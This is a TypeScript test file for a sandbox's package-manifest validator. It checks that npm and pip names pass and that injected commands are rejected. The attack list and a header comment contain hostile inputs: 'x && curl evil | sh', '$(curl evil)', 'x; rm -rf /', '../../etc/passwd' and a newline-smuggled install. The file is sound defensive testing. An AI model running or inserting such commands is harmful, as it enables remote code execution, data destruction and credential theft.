// WHAT A JOB NEEDS IN THE SANDBOX — and the one line standing between a name and a command.
//
// Installing from a manifest is running somebody's code, and it is NOT a new capability: the sandbox
// already runs an agent holding `bash`, so anything a declared package could do the agent could
// already do by typing the install itself. What this changes is that it happens once, before the
// run, bounded and reported, instead of as a surprise mid-task.
//
// What WOULD be new is a manifest smuggling a flag or a shell, and that is what every test below is
// about. `npm i react --foo=$(curl evil)` is not a package name.

import { test } from "node:test";
import assert from "node:assert/strict";
import {
  describePackages,
  hasPackages,
  installScript,
  readPackages,
  MAX_PACKAGES,
} from "../src/packages";

test("real package names survive, including scopes and version pins", () => {
  const { packages, faults } = readPackages({
    npm: ["remotion", "@remotion/cli", "xlsx@0.20.3", "d3-scale"],
    pip: ["moviepy", "pandas==2.2.0", "python-docx"],
  });
  assert.deepEqual(faults, []);
  assert.deepEqual(packages.npm, ["remotion", "@remotion/cli", "xlsx@0.20.3", "d3-scale"]);
  assert.deepEqual(packages.pip, ["moviepy", "pandas==2.2.0", "python-docx"]);
});

test("pip ranges are accepted; an environment marker is not", () => {
  // Requirements files really do contain `>=` and `~=`, and refusing them pushes authors toward
  // pinning versions they have not tested. A marker (`pandas; python_version>"3.9"`) carries a
  // SEMICOLON, which is the thing this whole file exists to keep out.
  const ok = readPackages({ pip: ["pandas>=2.0", "requests~=2.31", "numpy==1.26.4"] });
  assert.deepEqual(ok.faults, []);
  assert.equal(ok.packages.pip?.length, 3);
  const bad = readPackages({ pip: ['pandas; python_version>"3.9"'] });
  assert.equal(bad.packages.pip, undefined);
});

test("an npm pin is not a pip pin — one regex could not do both", () => {
  // The bug this caught: a single pattern allowed `xlsx@0.20.3` and rejected `pandas==2.2.0`, so
  // every pinned Python package a trade declared would have been silently dropped.
  assert.deepEqual(readPackages({ npm: ["xlsx@0.20.3"] }).faults, []);
  assert.deepEqual(readPackages({ pip: ["pandas==2.2.0"] }).faults, []);
});

test("nothing that is not a name gets through", () => {
  // The whole security boundary. Each of these is a way to turn an install into a command, and the
  // separator that makes it work is the only thing being rejected.
  const attacks = [
    "react --registry=http://evil",
    "x; rm -rf /",
    "x && curl evil | sh",
    "x`whoami`",
    "$(curl evil)",
    "../../etc/passwd",
    "/tmp/local-thing",
    "git+https://github.com/x/y",
    "http://evil/pkg.tgz",
    "file:./pkg",
    "a b",
    "--force",
    "x\nnpm i evil",
  ];
  const { packages, faults } = readPackages({ npm: attacks });
  assert.equal(packages.npm, undefined, "not one of those is a package name");
  assert.equal(faults.length, attacks.length);
  for (const f of faults) assert.match(f.why, /not a plain package name|is not a name/);
});

test("a refused name is reported, never sanitised into something adjacent", () => {
  // Quietly installing `rm-rf` because somebody wrote `rm -rf` would be the worst of both: the thing
  // asked for did not happen AND something else did.
  const { packages, faults } = readPackages({ npm: ["rm -rf", "lodash"] });
  assert.deepEqual(packages.npm, ["lodash"], "the good one still installs");
  assert.equal(faults.length, 1);
  assert.equal(faults[0]!.name, "rm -rf", "the fault names what was actually written");
});

test("a job cannot build a distribution inside itself", () => {
  const many = Array.from({ length: MAX_PACKAGES + 5 }, (_, i) => `pkg-${i}`);
  const { packages, faults } = readPackages({ npm: many });
  assert.equal(packages.npm?.length, MAX_PACKAGES);
  assert.ok(faults.some((f) => /past the limit/.test(f.why)));
});

test("a malformed declaration is a fault, not a crash", () => {
  assert.deepEqual(readPackages(undefined).packages, {});
  assert.deepEqual(readPackages("remotion").packages, {});
  assert.deepEqual(readPackages([]).packages, {});
  const { faults } = readPackages({ npm: "remotion" });
  assert.match(faults[0]!.why, /list of package names/);
});

test("the install script cannot be broken by what it installs", () => {
  // Every name in it has already passed SAFE_NAME, so the script is only ever joining literals —
  // but the assertion is worth having, because the day somebody widens the regex this is what
  // notices.
  const { packages } = readPackages({ npm: ["@remotion/cli", "xlsx@0.20.3"], pip: ["moviepy"] });
  const script = installScript(packages);
  assert.match(script, /npm install --prefix \/root/);
  assert.match(script, /@remotion\/cli/);
  assert.match(script, /--break-system-packages/);
  for (const shell of ["$(", "`", "&&", ";", "|", ">"]) {
    // `|` and `;` legitimately appear in the script's own plumbing (`| tail`, `; exit`), so this
    // checks the NAMES did not introduce any — by asserting the count matches the empty case.
    const empty = installScript(readPackages({ npm: ["a"], pip: ["b"] }).packages);
    const count = (t: string) => t.split(shell).length;
    assert.equal(count(script), count(empty), `${shell} count changed with the package names`);
  }
});

test("an agent is told what it has", () => {
  // A capability the agent does not know about is a capability it does not use — and the install is
  // then pure cost. A wedge that declares a charting library and never mentions it gets runs that
  // describe a chart in prose.
  const { packages } = readPackages({ npm: ["remotion"], pip: ["moviepy"] });
  const said = describePackages(packages).join("\n");
  assert.match(said, /remotion/);
  assert.match(said, /moviepy/);
  assert.match(said, /python3/, "it says how to run the Python one");
  assert.deepEqual(describePackages({}), [], "nothing declared, nothing claimed");
});

test("hasPackages is false for every empty shape", () => {
  for (const p of [undefined, {}, { npm: [] }, { pip: [] }, { npm: [], pip: [] }]) {
    assert.equal(hasPackages(p), false, JSON.stringify(p));
  }
  assert.equal(hasPackages({ npm: ["x"] }), true);
});
